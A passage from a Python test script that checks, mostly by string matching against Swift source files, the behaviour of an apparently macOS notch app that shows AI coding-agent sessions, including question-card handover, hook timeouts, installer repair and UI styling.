      "waiting for your answer in the chat" in _vw5 and "go to the chat" in _vw5)
check("the copy clears once the chat answers",
      "store.hooks.pendingQuestions[q.session]?.id != q.id" in _is5)

# The reported bug: closing the card and reopening from the row restarted at question one and
# lost every pick, because the answer-so-far was tied to the card being on screen (state ==
# .question) rather than to the question id.
check("closing and reopening keeps the answer-so-far",
      "if answeringId != question.id {" in _is5
      and "private var answeringId: String?" in _is5)
check("a reset happens only for a genuinely new question",
      "questionStep = 0; picks = [:]; typed = [:]" in
      _is5.split("if answeringId != question.id {")[1].split("}")[0])
check("resolving a question clears its saved state",
      "if answeringId == id { answeringId = nil" in _is5)

# The card shows how long is left before it hands to the chat, and every interaction resets it.
check("the card counts down to the handover",
      "TimelineView(.periodic(from: graceBase" in _vw5 and 'systemName: "timer"' in _vw5)
check("the countdown length matches the hook's grace",
      "static let graceSeconds: TimeInterval = 60" in _is5)

# Answering in the chat is an explicit choice that keeps the notch copy up rather than
# blanking it, so the question is visible in both places.
# A handed-over mirror had no timeout and counted as a live card, so it wedged the notch: every
# new question or approval from any session queued behind it forever. A stale card must yield.
check("a stale card does not count as a live one",
      "if case .question(let q) = state { return !isStaleCard(q) }" in _is5
      and "handedOver.contains(q.id) || q.abandoned" in _is5)
check("a new question takes the stage from a stale card",
      "if isStaleCard(q) {" in _is5.split("func ask(")[1].split("followActiveScreen")[0])
check("a mirror is dropped once its window elapses",
      "|| q.deadline <= Date()" in _is5)
check("answer-in-chat hands over and keeps the mirror",
      "func handToChat" in _is5 and "handedOver.insert(q.id)" in
      _is5.split("func handToChat")[1].split("}")[0]
      and "answer in chat →" in _vw5)

# The silent-failure guard: a timeout below the window means answers are written and never
# read, so the installer has to say so rather than leaving it to be discovered at 3am.
_ih2 = open(os.path.join(REPO, "scripts/install-hooks.py")).read()
check("the installer checks the harness deadline against the window",
      "def check_deadline():" in _ih2 and "never read" in _ih2)
_probe = f"{RUN}-deadline.json"
json.dump({"hooks": {"PreToolUse": [{"matcher": "AskUserQuestion", "hooks": [
    {"type": "command", "command": "x/agentisland-question.py", "timeout": 60}]}]}},
    open(_probe, "w"))
_out = subprocess.run([sys.executable, "-c", f"""
import json, re, os, sys
src = open({os.path.join(REPO, 'hooks/agentisland-question.py')!r}).read()
window = float(re.search(r'AGENTISLAND_Q_TIMEOUT", "([0-9.]+)"', src).group(1))
cfg = json.load(open({_probe!r}))
for g in cfg["hooks"]["PreToolUse"]:
    for h in g["hooks"]:
        if "agentisland-question" in json.dumps(h) and float(h.get("timeout", 600)) <= window:
            print("WARN")
"""], capture_output=True, text=True).stdout
check("and a timeout below the window trips it", "WARN" in _out)

# An already-installed entry used to be left exactly as it was, so this fix would never have
# reached anyone who had installed before it.
# Take the function alone. Importing the script would run the real installer and rewrite the
# settings of whoever is running the suite.
import shlex as _shlex
_fn = _ih[_ih.index("def add_hook("):]
_fn = _fn[:_fn.index("\ndef ", 1)]
_ns = {"json": json, "os": os, "shlex": _shlex,
       "MARK": re.search(r'^MARK\s*=\s*"([^"]*)"', _ih, re.M).group(1)}
exec(compile(_fn, "add_hook", "exec"), _ns)
_ns["QUESTION"] = "'/tmp/agentisland/hooks/agentisland-question.py'"
_cfg = {"hooks": {"PreToolUse": [{"matcher": "AskUserQuestion", "hooks": [
    {"type": "command", "command": _ns["QUESTION"], "timeout": 60}]}]}}
_changed = _ns["add_hook"](_cfg, "PreToolUse", _ns["QUESTION"],
                           matcher="AskUserQuestion", timeout=310)
_got = _cfg["hooks"]["PreToolUse"][0]["hooks"][0].get("timeout")
check("a stale timeout is repaired, not left alone", _changed and _got == 310, f"now {_got}")
_again = _ns["add_hook"](_cfg, "PreToolUse", _ns["QUESTION"],
                         matcher="AskUserQuestion", timeout=310)
check("and reinstalling an unchanged hook reports no change", not _again)

# Answering in the terminal has to be possible at once: Claude cannot show its own picker
# while this hook still holds the turn.
_sd = f"{RUN}-skipdec"
os.makedirs(_sd, exist_ok=True)
for f in os.listdir(_sd): os.remove(os.path.join(_sd, f))
_ss = f"{RUN}-skipspool.jsonl"
if os.path.exists(_ss): os.remove(_ss)
open(f"{RUN}-skipalive", "w").write("1")
_box = {}
def _runskip():
    _t0 = time.time()
    _box["r"] = subprocess.run([qh], input=QREQ, capture_output=True, text=True, timeout=60,
        env=dict(os.environ, AGENTISLAND_ALIVE=f"{RUN}-skipalive", AGENTISLAND_Q_TIMEOUT="40",
                 AGENTISLAND_SPOOL=_ss, AGENTISLAND_DECISIONS=_sd))
    _box["took"] = time.time() - _t0
_th = threading.Thread(target=_runskip); _th.start()
for _ in range(60):
    if os.path.exists(_ss) and open(_ss).read().strip(): break
    time.sleep(0.2)
_sid = json.loads(open(_ss).readline())["ap_question_id"]
time.sleep(1.0)
open(os.path.join(_sd, _sid + ".skip"), "w").write("")     # reader chose the terminal
_th.join()
check("handing back to the terminal ends the wait at once",
      _box["took"] < 6 and not _box["r"].stdout.strip(), f"{_box['took']:.1f}s")
check("the handover cleans up after itself",
      not os.path.exists(os.path.join(_sd, _sid + ".skip"))
      and not os.path.exists(os.path.join(_sd, _sid + ".hold")))
check("open in terminal hands the question back",
      "Approvals.skip(q.id)" in _is5 and "static func skip(" in _ap5)

# The window went from 45s to 300s, so a card whose hook has gone — an interrupted turn, a
# cancelled tool — now lingers five minutes instead of one. It has to notice.
_hs6 = open(os.path.join(REPO, "Sources/AgentIsland/HookStream.swift")).read()
check("a question knows which hook is waiting on it", "var hookPid: Int?" in _hs6)
check("a question whose hook is gone is abandoned",
      "var abandoned: Bool { hookPid.map { !Proc.alive($0) } ?? false }" in _hs6)
check("abandoned questions are kept for the read-only copy",
      "pendingQuestions.filter { !$0.value.abandoned }" not in _hs6)
check("and the card on screen becomes that copy",
      "if case .question(let q) = state, q.abandoned {" in _is5
      and "handedOver.insert(q.id)" in _is5)

# The id is the only place the waiting pid is recorded, so its shape is load-bearing.
_ids = {"aq-24374-1788756269": 24374, "aq-1-2": 1, "nope": None, "aq-x-2": None}
def _pid(i):
    ps = i.split("-")
    if len(ps) < 3: return None
    try: return int(ps[1])
    except ValueError: return None
check("the waiting pid is recoverable from the id",
      all(_pid(k) == v for k, v in _ids.items()))

# A silent launch failure is the worst version of tonight's bug: no island, so every hook
# falls through and nothing in the notch ever appears again.
_sh = open(os.path.join(REPO, "install.sh")).read()
check("install verifies the app actually started",
      "pgrep -x AgentIsland" in _sh.split("==> launching")[1]
      and "did not start" in _sh)
check("and re-registers the bundle it just replaced", "lsregister" in _sh)
check("a failed launch is a failed install", "exit 1" in _sh.split("==> launching")[1])

print("\n=== 29. material toggle keeps the solid UI intact ===")
_sf = open(os.path.join(REPO, "Sources/AgentIsland/Surface.swift")).read()
_iv = open(os.path.join(REPO, "Sources/AgentIsland/Island.swift")).read()
_vw = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
check("solid is the default, so nobody is opted into sleek by upgrading",
      'UserDefaults.standard.string(forKey: Self.key) ?? "") ?? .solid' in _sf)
check("the original solid fill is still the code that draws solid",
      "shape.fill(Theme.bg)" in _sf and "case solid, sleek" in _sf)
check("the choice survives a relaunch",
      "UserDefaults.standard.set(choice.rawValue, forKey: Self.key)" in _sf)
check("flipping is reachable without the panel open (lasting hotkey)",
      "kVK_ANSI_G, Hotkeys.cmdOpt" in _iv and "Surfaces.shared.toggle()" in _iv)
check("and discoverable in the header", "materialChip" in _vw)
check("the shell reads the toggle instead of a hardcoded fill",
      "IslandBackground(corner: corner" in _iv and ".fill(Theme.bg)" not in _iv)

# Measured off Droppy over a dark AND a bright desktop: #000000 both times. The previous
# attempt frosted the whole face, which the user called sandpaper. Guard against regressing.
check("sleek is opaque black, not a frosted panel",
      "static let body      = Color.black" in _sf
      and "NSVisualEffectView" not in _sf and "hudWindow" not in _sf)
# Droppy's edge is background-to-black in ONE pixel with no highlight; the rim that was
# here rendered as a #414141 line across the top and had to go.
check("there is no invented rim stroke on the sleek shell",
      "private var rim" not in _sf and "shape.stroke(Theme.hairline" in _sf)
check("the soft edge is an alpha mask, as Droppy's DroppyEdgeFadeMask is",
      "dissolve(over:" in _sf and ".mask(" in _sf
      and ".black.opacity(0)" in _sf)
check("and it scales so a short collapsed bar is not erased",
      "min(Sleek.fadeLength, height * 0.3, max(0, inset))" in _sf)
# 26pt of fade over 8pt of padding drew the last row over the desktop.
check("the fade can never exceed the empty space below the content",
      "var inset: CGFloat" in _sf and "inset: bottomInset" in _iv
      and "case .expanded:  return PanelView.listPadding" in _iv
      # the wiring existing is not the point; the clamp has to actually consume it
      and "inset" in _sf.split("func dissolve")[1].split("\n    }")[0])
check("no dead surface code is asserted on",
      "SleekChip" not in _sf and "struct SleekChip" not in _sf)

print("\n=== 30. idle bar spends its empty space on what is left ===")
check("idle shows remaining, not consumed",
      "max(0, 100 - pct))% left" in _vw)
check("and when it refills", "Quota.short(r.timeIntervalSinceNow)" in _vw)
check("the reset is only shown while it is still in the future", "r > Date()" in _vw)
check("width is measured from the string the bar will actually print",
      "text: bar.leadText, usage: bar.quietUsageLine" in _iv)
# The old call passed no usage at all, so the quiet width sat on its 158pt floor and a
# longer line clipped.
check("so the quiet width can no longer disagree with the text",
      "usage: bar.quietUsageLine" in _iv)

print("\n=== 31. code-review fixes ===")
_ag = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
_cv = open(os.path.join(REPO, "Sources/AgentIsland/ConsoleView.swift")).read()
_cs = open(os.path.join(REPO, "Sources/AgentIsland/Console.swift")).read()
_pm = open(os.path.join(REPO, "Sources/AgentIsland/PanelModes.swift")).read()

# The console reads transcripts on .userInitiated while the refresh rewrites the same
# dictionaries on .utility. Two threads reassigning one Dictionary is a use-after-free.
check("Transcript's caches are locked, not raced",
      "private static let lock = NSLock()" in _ag.split("enum Transcript")[1]
      and "pathCache[sessionId] = p" not in _ag
      and "activeCache[a.sessionId] = (mtime" not in _ag)
check("every session cache is still bounded, including the new one",
      "Console.retain(ids)" in _ag and "ToolCalls.retain(ids)" in _ag)
check("Console.retain is no longer dead code", "static func retain" in _cs)

check("a card that needs you outranks a glance",
      "case .approval, .question: return" in _iv)
check("and an open panel releases what it holds before the console takes over",
      "private func tearDownPanel()" in _iv
      and "case .expanded: tearDownPanel()" in _iv)
check("the console polls its hit region at the interactive cadence",
      "repoll()" in _iv.split("func openConsole")[1].split("func closeConsole")[0])

check("the console feed refreshes instead of freezing at open time",
      ".onReceive(tick)" in _cv and "Timer.publish(every:" in _cv)
# `session` is a let on the captured view value, so comparing it to itself was always true.
check("a stale read cannot overwrite a newer session",
      "guard !Task.isCancelled else { return }" in _cv and "guard id == session" not in _cv)
check("it opens at the newest entry, after layout",
      ".onChange(of: feed.count)" in _cv)

# Console can only resolve Claude transcripts, so other vendors opened an empty reader.
check("the read chip is only offered where a transcript exists",
      "row.agent.vendor == .claude" in _vw)
check("and the summon chord skips vendors it cannot read",
      "store.rows.filter { $0.agent.vendor == .claude }" in _iv)

check("the plan reader cannot outgrow the height the card reserves",
      "vertical: style == .reading" in _pm)
check("the idle line's width cap fits what it now prints", "min(300," in _vw)
# Theme reads Surfaces statically, which SwiftUI cannot track as a dependency.
check("toggling the surface repaints every view, not just the observers",
      ".id(surfaces.choice)" in _iv)

print("\n=== 32. one motion vocabulary ===")
_th = open(os.path.join(REPO, "Sources/AgentIsland/Theme.swift")).read()
check("there is a single named motion set", "enum Motion {" in _th
      and all(k in _th for k in ["static let shell", "static let content",
                                 "static let quick", "static let hover", "static let value"]))
# Eleven ad-hoc curves meant things moving together ran on different clocks.
_raw = []
for f in ("Island.swift", "Views.swift"):
    body = open(os.path.join(REPO, "Sources/AgentIsland", f)).read()
    for lit in (".spring(response:", ".snappy(duration:", ".easeOut(duration:"):
        if lit in body:
            _raw += [f"{f}:{lit}" for _ in range(body.count(lit))]
check("no view spells its own curve any more", not _raw, f"{len(_raw)} left: {_raw[:3]}")
check("the shell's content crossfades instead of popping",
      ".transition(.opacity.animation(Motion.content))" in _iv)
check("the vendor pill morphs rather than jumping",
      ".contentTransition(.opacity)" in _vw and ".animation(Motion.content, value: v)" in _vw)

print("\n=== 33. blocked means stalled, not 'your turn' ===")
_as = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
# The harness marks every bg job "blocked" the moment its turn ends, so an ordinary
# conversation awaiting a reply was badged and promoted above working rows.
check("dormantBlocked actually checks dormancy",
      "static let dormantAfter" in _as
      and "Date().timeIntervalSince(seen) > Self.dormantAfter" in _as)
check("a chat you just replied in is not blocked",
      "guard let seen = lastActive else { return true }" in _as)
check("and blocked still outranks working once it is real",
      "if r.dormantBlocked { return 1 }" in _as and "r.isWorking ? 2 : 3" in _as)
check("liveness and the working guard are still required",
      "!(live?.waiting ?? false), !isWorking" in _as
      and "Proc.alive" in _as.split("var dormantBlocked")[1].split("}")[0] + _as.split("var dormantBlocked")[1][:400])

print("\n=== 34. finished work reads as completed, then decays to idle ===")
_as6 = open(os.path.join(REPO, "Sources/AgentIsland/AgentStore.swift")).read()
_vw6 = open(os.path.join(REPO, "Sources/AgentIsland/Views.swift")).read()
check("there is a completed window, and it is an hour",
      "static let completedFor: TimeInterval = 3600" in _as6)
check("it decays to idle past the window",
      "Date().timeIntervalSince(seen) <= Self.completedFor" in _as6)
# "completed" must never shadow a state that needs attention.
check("working, waiting, died and blocked all outrank it",
      "guard !isWorking, !waiting, died == nil, !dormantBlocked," in _as6)
check("a session with no activity at all is idle, not completed",
      "let seen = lastActive else { return false }" in _as6.split("var justCompleted")[1][:300])
check("the row prints it ahead of idle",
      'row.justCompleted ? "completed" : "idle"' in _vw6)
# The palette rule is three semantic hues; this distinction is carried by weight.
check("and distinguishes it by weight, not a new hue",
      "row.justCompleted ? Theme.muted : Theme.faint" in _vw6)

print("\n=== 23. binary builds & launches ===")
b=os.path.join(REPO,".build/debug/AgentIsland")
check("binary exists", os.path.exists(b))

print()
print(f"RESULT: {len(fails)} failure(s)" + (": "+", ".join(fails) if fails else " — all green"))
sys.exit(1 if fails else 0)
